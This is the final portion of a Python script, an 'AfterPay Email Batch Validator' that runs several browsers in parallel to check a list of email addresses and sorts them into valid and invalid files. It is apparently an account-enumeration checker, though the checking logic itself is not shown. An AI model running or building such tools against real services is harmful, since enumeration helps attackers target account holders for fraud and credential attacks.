                    pass
                validator.close()
            except Exception:
                pass
            logger.info(f"🏁 Browser {browser_id} finished")
            
        except Exception as e:
            logger.error(f"❌ Browser {browser_id} failed to start: {e}")
    
    def process_emails(self, emails):
        """Process list of emails with multiple browsers"""
        if not emails:
            logger.error("❌ No emails to process!")
            return
        
        # Before starting, cleanup orphan drivers from previous runs
        try:
            self.cleanup_orphan_drivers()
        except Exception:
            pass
        # Add emails to queue
        for email in emails:
            self.email_queue.put(email)
        
        logger.info(f"🚀 Starting batch validation with {self.num_browsers} browsers...")
        logger.info(f"📊 Total emails to process: {len(emails)}")
        
        start_time = time.time()
        
        # Start browser threads
        threads = []
        for i in range(min(self.num_browsers, len(emails))):
            browser_id = i + 1
            thread = threading.Thread(target=self.browser_worker, args=(browser_id,))
            thread.start()
            threads.append(thread)
            # Stagger browser starts to reduce simultaneous resource spike
            try:
                import random
                delay = self.stagger_between_browsers + random.uniform(0, 0.6)
            except Exception:
                delay = self.stagger_between_browsers
            time.sleep(delay)
        
        # Wait for all threads to complete
        for thread in threads:
            thread.join()
        
        end_time = time.time()
        total_time = end_time - start_time
        
        # Calculate stats
        valid_count = sum(1 for r in self.results if r['valid'])
        invalid_count = len(self.results) - valid_count
        emails_per_minute = (len(self.results) / total_time) * 60 if total_time > 0 else 0
        
        # Print results
        print("\n" + "="*60)
        print("📋 BATCH VALIDATION RESULTS")
        print("="*60)
        print(f"⏰ Total time: {total_time:.1f} seconds")
        print(f"📊 Total emails: {len(self.results)}")
        print(f"✅ Valid emails: {valid_count}")
        print(f"❌ Invalid emails: {invalid_count}")
        print(f"⚡ Speed: {emails_per_minute:.1f} emails/minute")
        print(f"💾 Results saved to: valid.txt & invalid.txt")
        print("="*60)
        # Call summary callback for GUI integration if provided
        summary = {
            'total_time': total_time,
            'total_emails': len(self.results),
            'valid_count': valid_count,
            'invalid_count': invalid_count,
            'emails_per_minute': emails_per_minute
        }
        if self.summary_callback:
            try:
                self.summary_callback(summary)
            except Exception:
                pass
        return summary

    def stop(self):
        """Set stop flag to signal worker threads to stop"""
        self._stop_event.set()

    def pause(self):
        """Pause processing (workers will wait between jobs)"""
        self._pause_event.set()

    def resume(self):
        """Resume processing after pause"""
        self._pause_event.clear()

def main():
    """Main function"""
    print("🚀 AfterPay Email Batch Validator")
    print("=" * 50)
    
    # Load emails from file
    processor = AfterPayBatchProcessor(num_browsers=3, headless=False)
    emails = processor.load_emails_from_file('list.txt')
    
    if not emails:
        print("❌ No emails found in list.txt!")
        print("📝 Please create list.txt with one email per line")
        return
    
    print(f"📋 Found {len(emails)} emails to validate")
    print(f"🖥️ Window size: 500x500")
    print(f"🌐 Browsers: 3 parallel")
    
    # Ask for confirmation
    confirm = input("\n🚀 Start batch validation? (y/n): ").strip().lower()
    if confirm != 'y':
        print("❌ Cancelled")
        return
    
    # Process emails
    processor.process_emails(emails)

if __name__ == "__main__":
    main()